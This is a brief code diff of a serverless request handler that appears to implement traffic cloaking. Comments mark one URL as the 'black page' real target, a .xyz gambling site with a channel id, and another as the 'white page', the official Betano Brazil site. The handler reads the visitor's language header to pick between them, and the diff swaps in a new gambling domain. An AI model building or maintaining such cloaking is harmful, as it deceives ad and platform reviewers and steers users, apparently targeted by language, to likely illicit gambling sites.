@@ -5,7 +5,7 @@ export async function onRequest(context) {
   const acceptLang = (request.headers.get("accept-language") || "").toLowerCase();
 
   // === 核心配置 ===
-  const BLACK_SITE_URL = "https://betaya7.xyz/?ch=130015"; // 黑页：真实目标
+  const BLACK_SITE_URL = "https://p7game1.xyz/?ch=290102"; // 黑页：真实目标
   const WHITE_OFFICIAL_URL = "https://www.betano.bet.br/"; // 白页：官方承载页
   
   // === 判定逻辑 ===
